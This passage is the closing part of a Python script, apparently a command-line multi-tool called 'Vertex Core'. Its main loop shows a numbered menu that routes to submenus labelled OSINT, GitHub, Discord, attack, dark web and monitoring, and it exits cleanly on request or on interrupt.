        print(f"{CYAN}SYSTEM STATUS: ONLINE{RESET}")
        print(f"{YELLOW}{timestamp()}{RESET}\n")
        show_main_menu()
        choice = get_simple_input("Enter category number", default=11, value_type=int, hint="[1-11]")
        if choice == 1:
            osint_menu()
        elif choice == 2:
            github_menu()
        elif choice == 3:
            discord_menu()
        elif choice == 4:
            attack_menu()
        elif choice == 5:
            ipweb_menu()
        elif choice == 6:
            gen_menu()
        elif choice == 7:
            utils_menu()
        elif choice == 8:
            darkweb_menu()
        elif choice == 9:
            about_menu()
        elif choice == 10:
            monitor_menu()
        elif choice == 11:
            print(f"{GREEN}Shutting down Vertex Core. Goodbye!{RESET}")
            sys.exit(0)
        else:
            print(f"{RED}Invalid option.{RESET}")
            pause()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}Interrupted. Exiting...{RESET}")
        sys.exit(0)
